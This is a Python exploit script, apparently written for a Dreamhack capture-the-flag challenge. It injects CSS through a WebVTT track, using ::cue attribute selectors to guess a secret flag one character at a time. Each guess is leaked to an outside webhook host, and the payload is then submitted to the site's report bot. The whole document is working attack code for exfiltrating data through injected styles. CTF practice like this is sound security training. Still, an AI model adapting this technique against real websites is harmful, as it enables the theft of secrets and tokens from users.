import requests
from urllib.parse import quote
import string

url = 'http://host3.dreamhack.games:12595/'
s = requests.Session()

charset = string.ascii_letters + string.digits + '_}'

webhook = 'http://cvkivvu.request.dreamhack.games'
known = 'YISF{'

def gen_payload():
    cands = []

    for char in charset:
        guess = known + char

        cands.append('::cue(v[voice^="%s"]){background:url(%s?e=%s)}' % (guess, webhook, guess))

    return f'<track default src="/review?text=WEBVTT%0d00:00.000-->00:30.000%0d%3Cv"/><style>{''.join(cands)}</style>'.replace('-->', '%2D%2D%3E')

payload = gen_payload()

res = s.post(f'{url}/report', data={
    'path': f'?xss={quote(payload)}'
})

assert 'success' in res.text.lower()
print("> Reported payload")